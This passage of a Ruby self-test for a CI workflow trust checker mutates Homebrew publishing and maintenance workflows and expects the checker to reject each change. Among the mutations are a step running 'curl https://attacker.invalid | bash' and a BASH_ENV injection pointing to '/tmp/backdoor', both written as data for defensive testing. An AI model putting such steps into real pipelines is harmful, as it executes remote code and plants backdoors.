        w, "publish-bottle-index",
        "Publish the complete Homebrew version index in isolated ORAS auth state"
      )
      step["run"] = step.fetch("run").sub("scripts/homebrew-ghcr-upload.sh", "oras push")
    },
    "missing anonymous readback" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["run"] = step.fetch("run").sub("homebrew-verify-public-bottle.ts", "true")
    },
    "missing exact public index traversal" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Validate exact public Homebrew index traversal without credentials"
      )
      step["run"] = step.fetch("run").sub("validate-publication-receipt", "true")
    },
    "partial browser runtime fetch" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Fetch the complete ABI browser runtime graph")
      step["run"] = step.fetch("run").sub("scripts/fetch-binaries.sh --fetch-only", "scripts/fetch-node.sh")
    },
    "sidecar forbidden roots dropped at dev-shell boundary" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Generate sidecars from the selected bottle")
      forwarding = 'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\'
      step["run"] = step.fetch("run").lines.reject { |line| line.include?(forwarding) }.join
    },
    "browser forbidden roots dropped at dev-shell boundary" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      forwarding = 'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\'
      step["run"] = step.fetch("run").lines.reject { |line| line.include?(forwarding) }.join
    },
    "raw bottle JSON handoff" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Validate build handoff and reconstruct canonical bottle JSON")
      step["run"] = step.fetch("run").sub(/\n\s+--out-bottle-json[^\n]+/, "")
    },
    "raw bottle metadata merge" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Compose only reconstructed bottle metadata into the fresh tap")
      step["run"] = step.fetch("run").sub('--bottle-json "$BOTTLE_JSON"',
                                             '--bottle-json "$RUNNER_TEMP/homebrew-build-handoff/bottle.json"')
    },
    "nonstrict browser smoke" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      step["run"] = step.fetch("run").sub("KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=1",
                                             "KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=0")
    },
    "skipped browser smoke accepted" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      step["run"] = step.fetch("run").sub(".stats.skipped == 0", ".stats.skipped >= 0")
    },
    "unvalidated publication handoff" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Validate the complete data-only publication payload")
      step["run"] = step.fetch("run").sub("scripts/homebrew-validate-publish-handoff.sh", "true")
    },
    "credentialed checkout before validation" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Checkout tap publication branch after payload validation")
      step["if"] = "${{ always() }}"
    },
    "failure report through dirty checkout" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Record failed attempt without replacing last-green metadata")
      step["run"] = step.fetch("run").sub("tap-report", "tap-publish")
    },
    "raw failure stderr" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Record failed attempt without replacing last-green metadata")
      step["run"] = "tail \"$RUNNER_TEMP/homebrew-finalize-error.txt\"\n#{step.fetch('run')}"
    },
    "untrusted executable step" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle").fetch("steps") << {
        "run" => "curl https://attacker.invalid | bash",
      }
    },
  }
  publisher_mutations.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(publisher)
      mutation.call(mutated)
      check_publisher(mutated)
    end
  end

  maintenance_mutations = {
    "maintenance top-level environment injection" => lambda { |w|
      w["env"] = { "BASH_ENV" => "/tmp/backdoor" }
    },
    "maintenance feature caller" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
    },
    "maintenance caller workflow bypass" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub("maintain-bottles.yml", "feature.yml")
    },
    "maintenance mode short circuit" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = "exit 0\n#{step.fetch('run')}"
    },
    "maintenance rebuild validation bypass" => lambda { |w|
      w.fetch("jobs").fetch("rebuild").delete("needs")
    },
    "maintenance repair mode" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["if"] =
        "${{ inputs.mode == 'rebuild' || inputs.mode == 'repair-only' }}"
    },
    "maintenance rollback write-all" => lambda { |w|
      w.fetch("jobs").fetch("rollback")["permissions"] = { "contents" => "write", "packages" => "write" }
    },
    "maintenance secret inheritance" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["secrets"] = "inherit"
    },
  }
  maintenance_mutations.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(maintenance)
      mutation.call(mutated)
      check_maintenance(mutated)
    end
  end
end

begin
  publisher = load_workflow(PUBLISHER_PATH)
  maintenance = load_workflow(MAINTENANCE_PATH)
  self_test(publisher, maintenance)
  check_publisher(publisher)
  check_maintenance(maintenance)
  check_tap_callers
  puts "check-homebrew-publish-workflow-trust.rb: ok"
rescue KeyError, Psych::Exception, RuntimeError => e
  warn "check-homebrew-publish-workflow-trust.rb: #{e.message}"
  exit 1
end
